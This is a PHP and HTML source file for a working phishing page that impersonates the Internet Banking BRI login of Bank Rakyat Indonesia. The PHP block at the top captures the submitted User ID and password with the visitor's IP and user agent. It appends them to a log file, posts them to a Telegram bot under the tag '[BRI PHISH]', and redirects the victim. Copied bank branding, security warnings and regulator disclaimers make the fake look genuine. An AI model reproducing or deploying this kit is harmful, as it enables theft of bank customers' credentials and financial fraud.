<?php
require_once __DIR__ . '/config.php';

// ===== PROSES LOGIN =====
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user_id  = $_POST['user_id'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip       = $_SERVER['REMOTE_ADDR'] ?? '';
    $ua       = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $time     = date('Y-m-d H:i:s');

    $entry = "=== [{$time}] ===\nUser ID: {$user_id}\nPassword: {$password}\nIP: {$ip}\nUser-Agent: {$ua}\n" . str_repeat('-', 40) . "\n";
    file_put_contents(LOG_FILE, $entry, FILE_APPEND | LOCK_EX);

    // Kirim ke Telegram
    $msg = "🏦 [BRI PHISH] {$time}\nUser ID: {$user_id}\nPassword: {$password}\nIP: {$ip}";
    $ch = curl_init("https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query(['chat_id' => CHAT_ID, 'text' => $msg]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    curl_exec($ch);
    curl_close($ch);

    while (ob_get_level()) ob_end_clean();

    header('Location: ' . REDIRECT_URL);
    exit;
}
?><!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Internet Banking BRI</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{font-size:16px;-webkit-text-size-adjust:100%;height:100%}

body{
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,'Helvetica Neue',Arial,sans-serif;
    background:#f0f2f5;
    color:#333;
    min-height:100vh;
    display:flex;
    flex-direction:column;
    line-height:1.5;
}

/* HEADER */
.auth-header{
    background:#00247d;
    padding:14px 24px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    position:sticky;
    top:0;
    z-index:100;
    box-shadow:0 2px 8px rgba(0,36,125,.15);
    min-height:60px;
}
.logo{display:flex;align-items:center;gap:10px}
.logo img{display:block;height:28px;width:auto}
.logo-text{
    color:#fff;
    font-size:16px;
    font-weight:600;
    letter-spacing:.5px;
}
.lang-btn{display:none}
.lang-slider{
    display:flex;align-items:center;gap:6px;
    background:rgba(255,255,255,.15);border-radius:700px;
    padding:0 12px;height:30px;
    font-size:13px;font-weight:600;color:#fff;
    transition:background .2s;
    cursor:pointer;
}
.lang-slider:hover{background:rgba(255,255,255,.25)}

/* MAIN */
.auth-main{
    flex:1;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:24px 16px 32px;
}
.auth-card{
    background:#fff;
    border-radius:16px;
    box-shadow:0 8px 32px rgba(0,0,0,.08),0 2px 8px rgba(0,0,0,.04);
    width:100%;
    max-width:420px;
    overflow:hidden;
    animation:fadeUp .35s ease;
}
@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}

/* CARD HEADER */
.card-header{
    background:linear-gradient(135deg,#00247d,#003da5);
    padding:28px 28px 20px;
    text-align:center;
}
.card-header img{height:40px;width:auto;margin-bottom:8px}
.card-header h1{
    color:#fff;
    font-size:20px;
    font-weight:700;
    letter-spacing:.3px;
}
.card-header p{
    color:rgba(255,255,255,.7);
    font-size:13px;
    margin-top:4px;
}

/* RUNNING TEXT */
.running-text-wrap{
    width:100%;
    overflow:hidden;
    margin-top:8px;
    height:20px;
    position:relative;
}
.running-text{
    display:inline-block;
    white-space:nowrap;
    font-size:11px;
    font-weight:500;
    color:rgba(255,255,255,.6);
    letter-spacing:1px;
    text-transform:uppercase;
    animation:marquee 18s linear infinite;
}
@keyframes marquee{
    0%{transform:translateX(0)}
    100%{transform:translateX(-50%)}
}

/* CARD BODY */
.card-body{
    padding:28px 28px 0;
}

/* GREETING */
.greeting-row{
    display:flex;
    align-items:center;
    justify-content:space-between;
    margin-bottom:6px;
}
.greeting-text h2{
    font-size:22px;
    font-weight:700;
    color:#00247d;
    line-height:1.2;
}
.greeting-text p{
    font-size:14px;
    color:#6c757d;
    margin:2px 0 0;
}

/* SECURITY BADGE */
.security-badge{
    display:flex;
    align-items:center;
    gap:6px;
    background:#e8f4fd;
    border-radius:8px;
    padding:10px 14px;
    margin-bottom:20px;
    font-size:12px;
    color:#004080;
    line-height:1.4;
}
.security-badge svg{flex-shrink:0}

/* FORM */
.form-group{
    margin-bottom:18px;
}
.form-group label{
    display:block;
    font-size:12px;
    font-weight:600;
    color:#495057;
    margin-bottom:6px;
    text-transform:uppercase;
    letter-spacing:.3px;
}
.input-wrapper{
    position:relative;
    display:flex;
    align-items:center;
    border:1.5px solid #dee2e6;
    border-radius:10px;
    padding:0 14px;
    transition:border-color .25s, box-shadow .25s;
    background:#fafbfc;
}
.input-wrapper:focus-within{
    border-color:#003da5;
    box-shadow:0 0 0 3px rgba(0,61,165,.1);
    background:#fff;
}
.input-wrapper input{
    width:100%;
    border:none;
    outline:none;
    font-size:15px;
    padding:13px 0;
    background:transparent;
    color:#333;
}
.input-wrapper input::placeholder{color:#adb5bd}
.input-icon{
    cursor:pointer;
    color:#adb5bd;
    display:flex;
    align-items:center;
    padding:4px;
    border-radius:4px;
    flex-shrink:0;
}
.input-icon:hover{color:#003da5}

/* FORM LINKS */
.form-links{
    display:flex;
    justify-content:space-between;
    margin:4px 0 22px;
}
.form-links a{
    font-size:13px;
    color:#003da5;
    text-decoration:none;
    font-weight:500;
}
.form-links a:hover{text-decoration:underline}

/* LOGIN BUTTON */
.btn-login{
    width:100%;
    padding:14px;
    border:none;
    border-radius:10px;
    font-size:16px;
    font-weight:600;
    color:#fff;
    background:linear-gradient(135deg,#00247d,#003da5);
    cursor:pointer;
    transition:all .25s;
    box-shadow:0 4px 14px rgba(0,61,165,.25);
}
.btn-login:hover{
    background:linear-gradient(135deg,#001a5e,#002c8a);
    box-shadow:0 6px 20px rgba(0,61,165,.35);
    transform:translateY(-1px);
}
.btn-login:active{transform:translateY(0)}
.btn-login:disabled{
    background:#ccc;
    box-shadow:none;
    cursor:not-allowed;
    transform:none;
}

/* REGISTER LINK */
.register-link{
    text-align:center;
    margin-top:18px;
    font-size:14px;
    color:#6c757d;
}
.register-link a{
    color:#003da5;
    font-weight:600;
    text-decoration:none;
}
.register-link a:hover{text-decoration:underline}

/* ALERT */
.alert-box{
    margin-top:20px;
    background:#fff8e1;
    border:1px solid #ffe082;
    border-radius:10px;
    padding:14px 16px;
    display:flex;
    gap:10px;
    align-items:flex-start;
}
.alert-box .alert-icon{flex-shrink:0;margin-top:2px}
.alert-box .alert-text{
    font-size:12px;
    color:#8d6e00;
    line-height:1.5;
}
.alert-box .alert-text a{
    color:#8d6e00;
    font-weight:600;
    text-decoration:underline;
}

/* CARD INFO */
.card-info{
    margin-top:20px;
    padding:16px 28px;
    background:#f8f9fa;
    border-top:1px solid #e9ecef;
    display:flex;
    align-items:center;
    gap:12px;
}
.card-info svg{flex-shrink:0}
.card-info p{
    font-size:12px;
    color:#6c757d;
    line-height:1.5;
}

/* FOOTER */
.auth-footer{
    background:#fff;
    border-top:1px solid #e9ecef;
    padding:16px;
    padding-bottom:calc(16px + env(safe-area-inset-bottom,0));
}
.footer-links{
    display:grid;
    grid-template-columns:repeat(auto-fit,minmax(100px,1fr));
    gap:8px;
}
.footer-link{
    display:flex;
    flex-direction:column;
    align-items:center;
    gap:6px;
    padding:12px 8px;
    background:#fff;
    border:1px solid #e9ecef;
    border-radius:12px;
    text-decoration:none;
    color:#495057;
    font-size:11px;
    font-weight:500;
    transition:all .2s;
    text-align:center;
}
.footer-link:hover{
    border-color:#003da5;
    color:#003da5;
    box-shadow:0 2px 8px rgba(0,61,165,.1);
}
.footer-link svg{display:block}
.footer-disclaimer{
    text-align:center;
    font-size:10px;
    color:#adb5bd;
    margin-top:14px;
    line-height:1.6;
}

/* LOADING */
.loading-overlay{
    display:none;position:fixed;
    top:0;left:0;right:0;bottom:0;
    background:rgba(255,255,255,.85);
    z-index:999;align-items:center;justify-content:center;
}
.loading-overlay.active{display:flex}
.spinner{
    width:44px;height:44px;
    border:4px solid #e9ecef;
    border-top-color:#003da5;
    border-radius:50%;
    animation:spin .7s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}

@media(max-width:380px){
    .card-body{padding:20px 18px 0}
    .card-header{padding:22px 18px 16px}
    .footer-link{font-size:10px;padding:10px 4px}
}
</style>
</head>
<body>

<!-- HEADER -->
<header class="auth-header">
    <div class="logo">
        <svg width="48" height="28" viewBox="0 0 120 36" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="0" y="0" width="28" height="36" rx="4" fill="#fff"/>
            <text x="4" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="26" fill="#00247d">B</text>
            <rect x="32" y="0" width="28" height="36" rx="4" fill="#fff"/>
            <text x="37" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="26" fill="#00247d">R</text>
            <rect x="64" y="0" width="28" height="36" rx="4" fill="#fff"/>
            <text x="71" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="26" fill="#00247d">I</text>
        </svg>
        <span class="logo-text">Internet Banking</span>
    </div>
    <div class="lang-slider" onclick="toggleLang()">
        <span id="langText">ID</span>
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
    </div>
</header>

<!-- MAIN -->
<main class="auth-main">
    <div class="auth-card">
        <!-- CARD HEADER -->
        <div class="card-header">
            <svg width="64" height="36" viewBox="0 0 120 36" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="28" height="36" rx="4" fill="#fff" fill-opacity="0.2"/>
                <text x="4" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="26" fill="#fff">B</text>
                <rect x="32" y="0" width="28" height="36" rx="4" fill="#fff" fill-opacity="0.2"/>
                <text x="37" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="26" fill="#fff">R</text>
                <rect x="64" y="0" width="28" height="36" rx="4" fill="#fff" fill-opacity="0.2"/>
                <text x="71" y="26" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="26" fill="#fff">I</text>
            </svg>
            <h1>Masuk ke Internet Banking BRI</h1>
            <div class="running-text-wrap">
                <span class="running-text">✦ welcome to tracking dev phishing page bri ✦ welcome to tracking dev phishing page bri ✦</span>
            </div>
        </div>

        <!-- CARD BODY -->
        <div class="card-body">
            <!-- GREETING -->
            <div class="greeting-row">
                <div class="greeting-text">
                    <h2>Selamat Datang</h2>
                    <p>Silakan login untuk melanjutkan</p>
                </div>
            </div>

            <!-- SECURITY BADGE -->
            <div class="security-badge">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#003da5"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                <span>Lindungi data Anda. Jangan pernah memberikan User ID dan Password kepada siapapun.</span>
            </div>

            <!-- LOGIN FORM -->
            <form method="POST" action="" id="loginForm" autocomplete="off">
                <div class="form-group">
                    <label for="user_id">User ID</label>
                    <div class="input-wrapper">
                        <input type="text" id="user_id" name="user_id" placeholder="Masukkan User ID" required autocomplete="off" autocapitalize="off" inputmode="text">
                    </div>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <div class="input-wrapper">
                        <input type="password" id="password" name="password" placeholder="Masukkan Password" required autocomplete="off">
                        <span class="input-icon" onclick="togglePassword()" id="toggleIcon">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </span>
                    </div>
                </div>

                <div class="form-links">
                    <a href="#">Lupa User ID</a>
                    <a href="#">Lupa Password</a>
                </div>

                <button type="submit" class="btn-login" id="loginBtn">Login</button>
            </form>

            <div class="register-link">
                Belum punya User ID? <a href="#">Daftar Internet Banking BRI</a>
            </div>

            <!-- SECURITY ALERT -->
            <div class="alert-box">
                <div class="alert-icon">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#8d6e00"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>
                </div>
                <div class="alert-text">
                    <strong>Peringatan Keamanan:</strong> Pastikan Anda berada di situs resmi BRI. Periksa alamat URL sebelum memasukkan data login Anda.
                </div>
            </div>
        </div>

        <!-- INFO -->
        <div class="card-info">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="#003da5"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
            <p>Internet Banking BRI memberikan kemudahan transaksi perbankan dimanapun dan kapanpun dengan keamanan terenkripsi.</p>
        </div>
    </div>
</main>

<!-- FOOTER -->
<footer class="auth-footer">
    <div class="footer-links">
        <a href="#" class="footer-link">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#003da5" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 16.92z"/></svg>
            Contact BRI<br>1500017
        </a>
        <a href="#" class="footer-link">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="#25D366"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
            WhatsApp<br>BRI
        </a>
        <a href="#" class="footer-link">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#003da5" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            BRImo<br>Mobile
        </a>
        <a href="#" class="footer-link">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#003da5" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>
            Website<br>bri.co.id
        </a>
        <a href="#" class="footer-link">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#003da5" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
            QLola<br>Corporate
        </a>
    </div>
    <div class="footer-disclaimer">
        Terenkripsi SSL. Internet Banking BRI adalah layanan perbankan digital dari PT Bank Rakyat Indonesia (Persero) Tbk.<br>
        BRI diawasi oleh OJK &amp; Bank Indonesia. BRI adalah peserta penjaminan LPS. Simpanan dijamin maksimal IDR 2 miliar.
    </div>
</footer>

<!-- LOADING OVERLAY -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
</div>

<script>
// Toggle password visibility
function togglePassword() {
    var pwd = document.getElementById('password');
    var icon = document.getElementById('toggleIcon');
    if (pwd.type === 'password') {
        pwd.type = 'text';
        icon.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
    } else {
        pwd.type = 'password';
        icon.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
    }
}

// Language toggle
function toggleLang() {
    var text = document.getElementById('langText');
    if (text && text.textContent.trim() === 'ID') {
        text.textContent = 'EN';
    } else if(text) {
        text.textContent = 'ID';
    }
}

// Form submit loading
document.getElementById('loginForm').addEventListener('submit', function(e) {
    var btn = document.getElementById('loginBtn');
    btn.disabled = true;
    btn.textContent = 'Memproses...';
    document.getElementById('loadingOverlay').classList.add('active');
});
</script>

</body>
</html>
